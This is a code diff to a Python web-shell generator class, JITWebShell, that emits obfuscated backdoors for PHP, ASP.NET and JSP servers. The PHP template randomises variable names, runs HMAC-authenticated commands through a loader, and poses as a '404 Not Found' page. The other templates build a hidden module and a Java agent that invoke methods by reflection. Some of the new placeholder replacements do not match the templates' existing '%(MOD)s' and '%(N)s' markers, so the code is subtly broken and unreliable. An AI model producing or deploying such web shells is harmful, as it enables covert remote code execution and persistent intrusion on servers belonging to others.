@@ -30,7 +30,7 @@ class JITWebShell:
     # ============================ PHP ============================ #
     def php(self) -> str:
         var_map = {v: '$' + ''.join(random.choices(string.ascii_letters + '_', k=8))
-                   for v in ['$k', '$c', '$e', '$i', '$f', '$l']}
+                   for v in ['$k', '$c', '$e', '$i', '$f', '$l', '$m']}
         funcs = ['openssl_decrypt', 'base64_decode', 'hash', 'hash_hmac']
         decl = """
 <?php
@@ -50,11 +50,23 @@ if($a){list($e,$i,$m)=explode(':',$a);
   if(hash_equals(hash_hmac('sha256',$e.$i,$k),$m)){echo json_encode(['r'=>$l->%RUN%($e,$i)]);}}
 else echo '<html><body><h1>404 Not Found</h1></body></html>';
 ?>
-""" % {**var_map, 'LOAD': 'DL' + ''.join(random.choices(string.digits, k=4)),
-       'RUN': 'r' + ''.join(random.choices(string.ascii_letters, k=3)),
-       'HEADERS': "getallheaders()",
-       'DECRYPT': "openssl_decrypt", 'k': var_map['$k'].lstrip('$'),
-       'l': var_map['$l'].lstrip('$')}
+"""
+        repl = {
+            '%LOAD%': 'DL' + ''.join(random.choices(string.digits, k=4)),
+            '%RUN%': 'r' + ''.join(random.choices(string.ascii_letters, k=3)),
+            '%HEADERS%': "getallheaders()",
+            '%DECRYPT%': "openssl_decrypt",
+            '%KEY%': var_map['$k'].lstrip('$'),
+            '%CIP%': var_map['$c'].lstrip('$'),
+            '%K%': var_map['$k'].lstrip('$'),
+            '%E%': var_map['$e'].lstrip('$'),
+            '%I%': var_map['$i'].lstrip('$'),
+            '%M%': var_map['$m'].lstrip('$'),
+            '%F%': var_map['$f'].lstrip('$'),
+            '%L%': var_map['$l'].lstrip('$'),
+        }
+        for k, v in repl.items():
+            decl = decl.replace(k, v)
         out, lines = [], decl.split('\n')
         for ln in lines:
             out.append(ln)
@@ -64,7 +76,7 @@ else echo '<html><body><h1>404 Not Found</h1></body></html>';
 
     # ============================ ASP.NET (C#) ============================ #
     def aspnet(self) -> str:
-        return """
+        _t = """
 using System; using System.IO; using System.Web; using System.Reflection;
 using System.Security.Cryptography; using System.Text;
 namespace M%(MOD)s {
@@ -99,12 +111,14 @@ namespace M%(MOD)s {
     public void Dispose(){}
   }
 }
-""" % {'MOD': ''.join(random.choices(string.digits, k=5)),
-       'KEY': 'a' * 16, 'IV': 'b' * 16}
+"""
+        return _t.replace('%MOD%', ''.join(random.choices(string.digits, k=5)))\
+                 .replace('%KEY%', 'a' * 16)\
+                 .replace('%IV%', 'b' * 16)
 
     # ============================ JSP ============================ #
     def jsp(self) -> str:
-        return """
+        _t = """
 import java.lang.instrument.Instrumentation;
 public class Agent%(N)s {
   public static Instrumentation inst;
@@ -131,7 +145,8 @@ public class Agent%(N)s {
       .getClass().getMethod(m,Object[].class).invoke(null,(Object)a);
   }
 }
-""" % {'N': ''.join(random.choices(string.digits, k=4))}
+"""
+        return _t.replace('%N%', ''.join(random.choices(string.digits, k=4)))
 
     # ============================ Node.js ============================ #
     def nodejs(self) -> str:
